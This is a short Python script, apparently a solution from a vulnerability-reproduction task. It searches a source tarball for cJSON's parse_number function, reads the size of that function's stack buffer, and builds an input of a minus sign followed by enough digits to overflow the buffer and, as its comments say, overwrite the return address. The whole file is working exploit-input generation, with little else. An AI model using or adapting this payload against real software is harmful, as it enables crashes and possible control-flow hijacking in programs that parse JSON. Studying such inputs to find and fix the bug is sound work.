import tarfile
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Default buffer size commonly used in cJSON's parse_number
        buffer_size = 64
        
        try:
            with tarfile.open(src_path, 'r') as tar:
                # Try to find cJSON.c specifically as it's the likely target
                target_member = None
                for member in tar.getmembers():
                    if member.name.endswith('cJSON.c'):
                        target_member = member
                        break
                
                candidates = [target_member] if target_member else [m for m in tar.getmembers() if m.name.endswith('.c')]
                
                for member in candidates:
                    if not member: 
                        continue
                    f = tar.extractfile(member)
                    if not f:
                        continue
                    
                    # Read enough content to find the function and buffer decl
                    content = f.read(100000).decode('utf-8', errors='ignore')
                    
                    if "parse_number" in content and "Infinity" in content:
                        found_size = self._extract_buffer_size(content)
                        if found_size:
                            buffer_size = found_size
                            break
                        
        except Exception:
            pass
        
        # The vulnerability is a stack buffer overflow in parse_number triggered by a leading minus sign
        # followed by non-infinity characters that overflow the local buffer.
        # We start with "-" to trigger the vulnerable path, then append digits to overflow.
        # We add a safety margin to the buffer size to ensure the return address is overwritten.
        return b"-" + b"1" * (buffer_size + 24)

    def _extract_buffer_size(self, content: str) -> int:
        # Locate the parse_number function definition
        idx = content.find("parse_number")
        if idx == -1:
            return None
        
        # Look within the function body (approximation)
        snippet = content[idx:idx+4000]
        
        # Regex to match: [unsigned] char name[size];
        # Handles: char buffer[64], unsigned char number[26], etc.
        # Does not match pointer assignments like char *p = ...
        match = re.search(r'(?:unsigned\s+)?char\s+\w+\[(\d+)\]', snippet)
        if match:
            return int(match.group(1))
        return None